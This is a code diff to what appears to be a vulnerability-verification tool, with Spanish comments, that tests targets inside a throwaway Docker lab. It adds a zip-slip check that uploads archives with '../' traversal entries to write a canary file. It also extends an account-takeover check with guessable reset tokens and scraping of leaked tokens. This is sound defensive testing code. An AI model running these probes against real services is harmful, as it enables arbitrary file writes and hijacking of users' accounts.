@@ -9489,6 +9489,165 @@ def verify_generic_business_logic(
             lab.teardown()
 
 
+# ---------------------------------------------------------------------------
+# Zip-slip (path traversal via archive extraction) verifier
+# ---------------------------------------------------------------------------
+
+def verify_generic_zip_slip(
+    source_dir: str,
+    upload_endpoint: str,
+    http_method: str = "POST",
+    file_param: str = "file",
+    confirm_endpoint: str = "",
+    on_step: Optional[Callable[[str], None]] = None,
+    budget_s: float = 900.0,
+    dockerfile_body: str = "", extra_files: Optional[dict] = None,
+) -> WpVerifyResult:
+    """Verifica zip-slip via archive extraction sin canonicalizacion de rutas.
+
+    Mecanismo:
+    1) Levanta el lab efimero.
+    2) Crea un ZIP en memoria con una entrada '../../../tmp/<canary_file>' cuyo
+       contenido es un token secreto aleatorio.
+    3) Sube el ZIP al endpoint de upload.
+    4) Comprueba si el token aparece en /tmp/<canary_file> o en la respuesta
+       de un endpoint de confirmacion (confirm_endpoint).
+
+    La confirmacion puede ser:
+    - GET confirm_endpoint que devuelve el contenido del fichero
+    - GET /api/file/<canary_file> (si el servidor sirve ficheros de /tmp)
+    - Respuesta directa del upload (si el servidor procesa la extraccion inline)
+
+    file_param:        nombre del campo multipart del ZIP
+    confirm_endpoint:  endpoint para verificar que el fichero se escribio
+    """
+    import io as _io
+    import zipfile as _zf
+
+    step = on_step or (lambda _m: None)
+    res = WpVerifyResult()
+    if not _docker_daemon_ok():
+        res.available = False
+        res.detail = "sin daemon Docker alcanzable"
+        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
+        return res
+
+    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
+                                   dockerfile_body=dockerfile_body, extra_files=extra_files)
+    if boot is None:
+        return res
+    lab, base_url, container = boot
+    try:
+        canary_token = _token()
+        canary_filename = f"zipslip_{canary_token[:8]}.txt"
+
+        # Build traversal ZIP: entry name uses ../ to escape the extraction dir
+        traversal_paths = [
+            f"../../../tmp/{canary_filename}",
+            f"../../tmp/{canary_filename}",
+            f"../../../../tmp/{canary_filename}",
+            f"../tmp/{canary_filename}",
+            # Absolute path variant (some extractors follow absolute paths)
+            f"/tmp/{canary_filename}",
+        ]
+
+        for traversal_path in traversal_paths:
+            # Build ZIP in memory with traversal entry
+            zip_buf = _io.BytesIO()
+            with _zf.ZipFile(zip_buf, "w", _zf.ZIP_DEFLATED) as zf:
+                zf.writestr(traversal_path, canary_token)
+            zip_buf.seek(0)
+            zip_bytes = zip_buf.read()
+
+            step(f"zip-slip: probando entrada {traversal_path!r} ({len(zip_bytes)}B)")
+
+            # Upload the ZIP via multipart POST
+            st, _, body_bytes = _http_request(
+                base_url, upload_endpoint, http_method,
+                files={file_param: (f"test_{canary_token[:8]}.zip", zip_bytes, "application/zip")},
+                timeout=20.0)
+            body = (body_bytes or b"").decode("utf-8", errors="replace")
+            step(f"  upload response: status={st} len={len(body)}")
+
+            # Check 1: token in upload response (server processes inline)
+            if canary_token in body:
+                res.verified = True
+                res.ok = True
+                res.evidence["zipslip_path"] = traversal_path
+                res.evidence["zipslip_token"] = canary_token
+                res.detail = (f"ZIP-SLIP CONFIRMADO (inline): token {canary_token!r} en "
+                              f"respuesta del upload via entry {traversal_path!r}")
+                step("VERIFICADO: zip-slip — token en respuesta del upload")
+                _add_exploit_evidence(
+                    res=res, method=http_method, url=base_url + upload_endpoint,
+                    resp_or_body=body, highlight=canary_token,
+                    caption_es=(f"ZIP-SLIP CONFIRMADO: entrada {traversal_path!r} "
+                                f"traverso fuera del directorio de extraccion."),
+                    caption_en=(f"ZIP-SLIP CONFIRMED: entry {traversal_path!r} "
+                                f"traversed outside extraction directory."),
+                )
+                return res
+
+            # Check 2: probe confirm_endpoint
+            if confirm_endpoint:
+                s2, _, b2 = _http_request(base_url, confirm_endpoint, "GET", timeout=10.0)
+                body2 = (b2 or b"").decode("utf-8", errors="replace")
+                if canary_token in body2:
+                    res.verified = True
+                    res.ok = True
+                    res.evidence["zipslip_path"] = traversal_path
+                    res.evidence["zipslip_token"] = canary_token
+                    res.detail = (f"ZIP-SLIP CONFIRMADO (fichero escritura): token {canary_token!r} "
+                                  f"en {confirm_endpoint} — extraccion wrote fuera del directorio")
+                    step(f"VERIFICADO: zip-slip — token en {confirm_endpoint}")
+                    _add_exploit_evidence(
+                        res=res, method="GET", url=base_url + confirm_endpoint,
+                        resp_or_body=body2, highlight=canary_token,
+                        caption_es=(f"ZIP-SLIP CONFIRMADO: fichero escrito en {traversal_path!r}."),
+                        caption_en=(f"ZIP-SLIP CONFIRMED: file written to {traversal_path!r}."),
+                    )
+                    return res
+
+            # Check 3: try to fetch the written file via common patterns
+            for probe_ep in [
+                f"/tmp/{canary_filename}",
+                f"/api/files/{canary_filename}",
+                f"/uploads/../tmp/{canary_filename}",
+                f"/static/../tmp/{canary_filename}",
+            ]:
+                s3, _, b3 = _http_request(base_url, probe_ep, "GET", timeout=8.0)
+                if s3 == 200 and canary_token in ((b3 or b"").decode("utf-8", errors="replace")):
+                    res.verified = True
+                    res.ok = True
+                    res.evidence["zipslip_path"] = traversal_path
+                    res.evidence["zipslip_written_at"] = probe_ep
+                    res.evidence["zipslip_token"] = canary_token
+                    res.detail = (f"ZIP-SLIP CONFIRMADO (fichero servido): token en {probe_ep} "
+                                  f"— extraccion escribio fuera del directorio via {traversal_path!r}")
+                    step(f"VERIFICADO: zip-slip — fichero servido en {probe_ep}")
+                    _add_exploit_evidence(
+                        res=res, method="GET", url=base_url + probe_ep,
+                        resp_or_body=(b3 or b"").decode("utf-8", errors="replace"),
+                        highlight=canary_token,
+                        caption_es=f"ZIP-SLIP CONFIRMADO: fichero en {probe_ep}.",
+                        caption_en=f"ZIP-SLIP CONFIRMED: file at {probe_ep}.",
+                    )
+                    return res
+
+        res.ok = True
+        res.detail = (f"zip-slip no detectado: {len(traversal_paths)} variantes de traversal "
+                      f"probadas en {upload_endpoint} (param={file_param!r}), "
+                      f"token canario no apareció fuera del directorio de extracción")
+        return res
+    except Exception as e:
+        res.detail = f"error inesperado en verify_generic_zip_slip: {e}"
+        return res
+    finally:
+        step("desmontando el laboratorio generico...")
+        if lab is not None:
+            lab.teardown()
+
+
 def verify_generic_multistep(
     source_dir: str,
     steps: list,
@@ -11378,14 +11537,22 @@ def verify_generic_account_takeover(
     _new_pass      = _sec.token_hex(8)
     _attacker_email = f"attacker_{_sec.token_hex(4)}@binoracle.test"
 
-    # Predictable token candidates
+    # Predictable token candidates — sequential IDs, hashes, timestamps, short UUIDs
     _ts = str(int(_t.time()))
     _token_candidates = [
-        "0", "1", "123456",
+        "0", "1", "2", "123456",
         _hsh.md5(_victim_email.encode()).hexdigest(),
+        _hsh.md5(_victim_email.encode()).hexdigest()[:8],
         _hsh.sha1(_victim_email.encode()).hexdigest()[:10],
+        _hsh.sha256(_victim_email.encode()).hexdigest()[:16],
         _ts,
+        _ts[:-1],
         _ts[:-2],
+        str(int(_t.time()) - 1),
+        str(int(_t.time()) + 1),
+        # Short UUID patterns used by weak generators
+        "00000000",
+        "11111111",
     ]
 
     lab = None
@@ -11424,6 +11591,14 @@ def verify_generic_account_takeover(
                 step(f"VERIFICADO — account takeover: confirm_string '{confirm_string[:30]}' "
                      f"encontrada al trigger reset")
                 return res
+
+            # Check if reset response leaks the token directly (IDOR on reset endpoint)
+            _leaked_tokens = re.findall(r'["\']?(?:token|reset_token|code)["\']?\s*[:=]\s*["\']?([a-fA-F0-9\-]{6,64})["\']?',
+                                        _reset_body)
+            if _leaked_tokens:
+                step(f"  token de reset expuesto en respuesta: {_leaked_tokens[:2]} (IDOR potencial)")
+                res.evidence["leaked_reset_tokens"] = _leaked_tokens[:5]
+                _token_candidates = list(_leaked_tokens[:5]) + _token_candidates
 
             # Try predictable tokens
             if login_endpoint:
